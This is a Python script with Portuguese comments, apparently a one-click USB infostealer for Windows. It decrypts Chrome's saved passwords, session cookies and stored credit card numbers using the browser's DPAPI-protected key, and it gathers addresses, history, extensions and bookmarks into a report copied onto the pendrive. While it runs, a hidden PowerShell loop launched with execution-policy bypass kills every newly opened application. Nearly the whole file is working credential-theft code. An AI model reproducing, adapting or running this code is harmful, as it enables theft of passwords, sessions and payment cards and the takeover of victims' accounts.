"""
COLETOR MÁXIMO + BLOQUEADOR DE APPS
Funciona com 1 clique no pendrive
"""

import os
import sys
import time
import json
import base64
import sqlite3
import shutil
import subprocess
import win32crypt
from Crypto.Cipher import AES
from datetime import datetime

# ============================================
# CONFIGURAÇÕES
# ============================================
USUARIO = os.getlogin()
PASTA_ATUAL = os.path.dirname(os.path.abspath(__file__))  # Onde o .exe está rodando
PASTA_SAIDA = os.path.join(PASTA_ATUAL, "Credenciais")
os.makedirs(PASTA_SAIDA, exist_ok=True)

ARQUIVO_LOG = os.path.join(PASTA_SAIDA, f"log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")

def log(texto):
    """Escreve no arquivo de log"""
    with open(ARQUIVO_LOG, "a", encoding="utf-8") as f:
        f.write(texto + "\n")
    print(texto)

# ============================================
# 1. BLOQUEADOR DE APPS
# ============================================
def ativar_bloqueio():
    """Impede que novos aplicativos sejam abertos"""
    log("🔒 Ativando bloqueio de apps...")
    
    # Técnica 1: Matar processos novos via PowerShell (loop rápido)
    script_bloqueio = """
    while ($true) {
        $novos = Get-Process | Where-Object { $_.StartTime -gt (Get-Date).AddSeconds(-2) -and $_.ProcessName -notin @('powershell', 'cmd', 'explorer', 'Coletor') }
        foreach ($p in $novos) {
            try { Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue } catch {}
        }
        Start-Sleep -Milliseconds 500
    }
    """
    
    # Salva o script temporário
    script_path = os.path.join(PASTA_SAIDA, "block.ps1")
    with open(script_path, "w") as f:
        f.write(script_bloqueio)
    
    # Executa o bloqueio em segundo plano (janela oculta)
    subprocess.Popen(
        f'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "{script_path}"',
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    
    log("✅ Bloqueio ativado!")
    return script_path

def desativar_bloqueio(script_path):
    """Remove o bloqueio"""
    log("🔓 Desativando bloqueio...")
    try:
        os.remove(script_path)
    except:
        pass
    # Mata processos PowerShell que estão rodando o bloqueio
    subprocess.run('taskkill /f /im powershell.exe', shell=True, capture_output=True)
    log("✅ Bloqueio desativado!")

# ============================================
# 2. COLETA MÁXIMA DO CHROME
# ============================================

def pegar_chave_mestra():
    """Pega a chave de criptografia do Chrome"""
    key_path = f"C:/Users/{USUARIO}/AppData/Local/Google/Chrome/User Data/Local State"
    with open(key_path, 'r') as f:
        local_state = json.load(f)
    chave = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    chave = win32crypt.CryptUnprotectData(chave, None, None, None, 0)[1]
    return chave

def coletar_senhas(chave):
    """Pega todas as senhas salvas"""
    log("  📂 Coletando senhas...")
    caminho = f"C:/Users/{USUARIO}/AppData/Local/Google/Chrome/User Data/Default/Login Data"
    if not os.path.exists(caminho):
        log("  ❌ Chrome não encontrado")
        return []
    
    temp = os.path.join(PASTA_SAIDA, "temp.db")
    shutil.copyfile(caminho, temp)
    
    creds = []
    conn = sqlite3.connect(temp)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    
    for url, user, senha_enc in cursor.fetchall():
        try:
            nonce = senha_enc[3:15]
            ciphertext = senha_enc[15:-16]
            tag = senha_enc[-16:]
            cipher = AES.new(chave, AES.MODE_GCM, nonce=nonce)
            senha = cipher.decrypt_and_verify(ciphertext, tag).decode()
            creds.append(f"URL: {url}\nUsuário: {user}\nSenha: {senha}\n")
        except:
            pass
    
    conn.close()
    os.remove(temp)
    log(f"  ✅ {len(creds)} senhas encontradas")
    return creds

def coletar_cookies(chave):
    """Pega todos os cookies (sessões ativas)"""
    log("  🍪 Coletando cookies...")
    caminho = f"C:/Users/{USUARIO}/AppData/Local/Google/Chrome/User Data/Default/Network/Cookies"
    if not os.path.exists(caminho):
        return []
    
    temp = os.path.join(PASTA_SAIDA, "cookies_temp.db")
    shutil.copyfile(caminho, temp)
    
    cookies = []
    conn = sqlite3.connect(temp)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    
    for host, nome, valor_enc in cursor.fetchall():
        try:
            nonce = valor_enc[3:15]
            ciphertext = valor_enc[15:-16]
            tag = valor_enc[-16:]
            cipher = AES.new(chave, AES.MODE_GCM, nonce=nonce)
            valor = cipher.decrypt_and_verify(ciphertext, tag).decode()
            cookies.append(f"Host: {host}\nCookie: {nome}={valor}\n")
        except:
            pass
    
    conn.close()
    os.remove(temp)
    log(f"  ✅ {len(cookies)} cookies encontrados")
    return cookies

def coletar_historico():
    """Pega histórico de navegação"""
    log("  📜 Coletando histórico...")
    caminho = f"C:/Users/{USUARIO}/AppData/Local/Google/Chrome/User Data/Default/History"
    if not os.path.exists(caminho):
        return []
    
    temp = os.path.join(PASTA_SAIDA, "history_temp.db")
    shutil.copyfile(caminho, temp)
    
    historico = []
    conn = sqlite3.connect(temp)
    cursor = conn.cursor()
    cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
    
    for url, titulo, _ in cursor.fetchall():
        historico.append(f"URL: {url}\nTítulo: {titulo}\n")
    
    conn.close()
    os.remove(temp)
    log(f"  ✅ {len(historico)} sites no histórico")
    return historico

def coletar_autofill():
    """Pega dados de autofill (endereços, cartões, etc)"""
    log("  📝 Coletando autofill...")
    caminho = f"C:/Users/{USUARIO}/AppData/Local/Google/Chrome/User Data/Default/Web Data"
    if not os.path.exists(caminho):
        return []
    
    temp = os.path.join(PASTA_SAIDA, "web_temp.db")
    shutil.copyfile(caminho, temp)
    
    dados = []
    conn = sqlite3.connect(temp)
    
    # Cartões de crédito
    try:
        cursor = conn.cursor()
        cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
        for nome, mes, ano, num_enc in cursor.fetchall():
            try:
                num = win32crypt.CryptUnprotectData(num_enc, None, None, None, 0)[1].decode()
                dados.append(f"CARTÃO: {nome} | {mes}/{ano} | {num}")
            except:
                pass
    except:
        pass
    
    # Endereços
    try:
        cursor = conn.cursor()
        cursor.execute("SELECT full_name, street_address, city, state, zipcode FROM autofill_profiles")
        for nome, rua, cidade, estado, cep in cursor.fetchall():
            dados.append(f"ENDEREÇO: {nome} | {rua}, {cidade}-{estado} | {cep}")
    except:
        pass
    
    conn.close()
    os.remove(temp)
    log(f"  ✅ {len(dados)} dados de autofill")
    return dados

def coletar_extensoes():
    """Lista extensões instaladas"""
    log("  🔌 Listando extensões...")
    path = f"C:/Users/{USUARIO}/AppData/Local/Google/Chrome/User Data/Default/Extensions"
    if not os.path.exists(path):
        return ["Nenhuma extensão encontrada"]
    
    extensoes = []
    for ext in os.listdir(path):
        if os.path.isdir(os.path.join(path, ext)):
            # Tenta ler o nome da extensão
            try:
                manifest = os.path.join(path, ext, "manifest.json")
                if os.path.exists(manifest):
                    with open(manifest, 'r') as f:
                        data = json.load(f)
                        nome = data.get("name", ext)
                        extensoes.append(f"  {nome} ({ext})")
            except:
                extensoes.append(f"  {ext}")
    
    log(f"  ✅ {len(extensoes)} extensões encontradas")
    return extensoes

def coletar_favoritos():
    """Pega favoritos/bookmarks"""
    log("  ⭐ Coletando favoritos...")
    path = f"C:/Users/{USUARIO}/AppData/Local/Google/Chrome/User Data/Default/Bookmarks"
    if not os.path.exists(path):
        return []
    
    with open(path, 'r', encoding='utf-8') as f:
        data = json.load(f)
    
    favoritos = []
    
    def extrair(node, pasta=""):
        if "children" in node:
            for child in node["children"]:
                if child.get("type") == "url":
                    favoritos.append(f"{pasta}/{child.get('name', '')} → {child.get('url', '')}")
                elif child.get("type") == "folder":
                    extrair(child, pasta + "/" + child.get("name", ""))
    
    extrair(data.get("roots", {}).get("bookmark_bar", {}))
    extrair(data.get("roots", {}).get("other", {}))
    
    log(f"  ✅ {len(favoritos)} favoritos encontrados")
    return favoritos

# ============================================
# 3. FUNÇÃO PRINCIPAL
# ============================================

def main():
    log("="*60)
    log("COLETOR MÁXIMO + BLOQUEADOR")
    log(f"Data: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")
    log(f"Usuário: {USUARIO}")
    log(f"Computador: {os.environ.get('COMPUTERNAME', 'N/A')}")
    log("="*60)
    
    # Ativa o bloqueio
    script_bloqueio = ativar_bloqueio()
    
    try:
        # Pega a chave do Chrome (necessária para descriptografar)
        log("\n🔑 Obtendo chave de criptografia...")
        chave = pegar_chave_mestra()
        log("✅ Chave obtida com sucesso!")
        
        # Coleta tudo
        log("\n📊 INICIANDO COLETA:")
        log("-"*40)
        
        dados = {
            "senhas": coletar_senhas(chave),
            "cookies": coletar_cookies(chave),
            "historico": coletar_historico(),
            "autofill": coletar_autofill(),
            "extensoes": coletar_extensoes(),
            "favoritos": coletar_favoritos()
        }
        
        # ============================================
        # 4. SALVAR RELATÓRIO
        # ============================================
        log("\n💾 Salvando relatório...")
        
        nome_arquivo = f"credenciais_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        caminho_saida = os.path.join(PASTA_SAIDA, nome_arquivo)
        
        with open(caminho_saida, "w", encoding="utf-8") as f:
            f.write("="*80 + "\n")
            f.write("RELATÓRIO COMPLETO - COLETA MÁXIMA\n")
            f.write(f"Data: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")
            f.write(f"Usuário: {USUARIO}\n")
            f.write(f"Computador: {os.environ.get('COMPUTERNAME', 'N/A')}\n")
            f.write("="*80 + "\n\n")
            
            # Senhas
            f.write("[1] SENHAS SALVAS\n")
            f.write("-"*40 + "\n")
            if dados["senhas"]:
                for item in dados["senhas"]:
                    f.write(item + "\n")
            else:
                f.write("Nenhuma senha encontrada\n")
            f.write("\n")
            
            # Cookies
            f.write("[2] COOKIES (SESSÕES ATIVAS)\n")
            f.write("-"*40 + "\n")
            if dados["cookies"]:
                for item in dados["cookies"]:
                    f.write(item + "\n")
            else:
                f.write("Nenhum cookie encontrado\n")
            f.write("\n")
            
            # Histórico
            f.write("[3] HISTÓRICO (ÚLTIMOS 100 SITES)\n")
            f.write("-"*40 + "\n")
            if dados["historico"]:
                for item in dados["historico"]:
                    f.write(item + "\n")
            else:
                f.write("Nenhum histórico encontrado\n")
            f.write("\n")
            
            # Autofill
            f.write("[4] DADOS DE AUTOFILL (CARTÕES/ENDEREÇOS)\n")
            f.write("-"*40 + "\n")
            if dados["autofill"]:
                for item in dados["autofill"]:
                    f.write(item + "\n")
            else:
                f.write("Nenhum dado de autofill encontrado\n")
            f.write("\n")
            
            # Extensões
            f.write("[5] EXTENSÕES INSTALADAS\n")
            f.write("-"*40 + "\n")
            for item in dados["extensoes"]:
                f.write(item + "\n")
            f.write("\n")
            
            # Favoritos
            f.write("[6] FAVORITOS\n")
            f.write("-"*40 + "\n")
            if dados["favoritos"]:
                for item in dados["favoritos"]:
                    f.write(item + "\n")
            else:
                f.write("Nenhum favorito encontrado\n")
        
        log(f"✅ Relatório salvo em: {caminho_saida}")
        
        # Também salva uma cópia na raiz do pendrive
        copia_pendrive = os.path.join(PASTA_ATUAL, f"credenciais_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
        shutil.copy(caminho_saida, copia_pendrive)
        log(f"💾 Cópia salva em: {copia_pendrive}")
        
        # ============================================
        # 5. ESTATÍSTICAS
        # ============================================
        log("\n📊 RESUMO DA COLETA:")
        log(f"  ✅ Senhas: {len(dados['senhas'])}")
        log(f"  ✅ Cookies: {len(dados['cookies'])}")
        log(f"  ✅ Histórico: {len(dados['historico'])}")
        log(f"  ✅ Autofill: {len(dados['autofill'])}")
        log(f"  ✅ Extensões: {len(dados['extensoes'])}")
        log(f"  ✅ Favoritos: {len(dados['favoritos'])}")
        
    except Exception as e:
        log(f"❌ ERRO: {e}")
    
    finally:
        # Desativa o bloqueio
        desativar_bloqueio(script_bloqueio)
    
    log("\n" + "="*60)
    log("✅ COLETA FINALIZADA!")
    log("="*60)
    
    # Aguarda 5 segundos e fecha
    time.sleep(5)

if __name__ == "__main__":
    main()
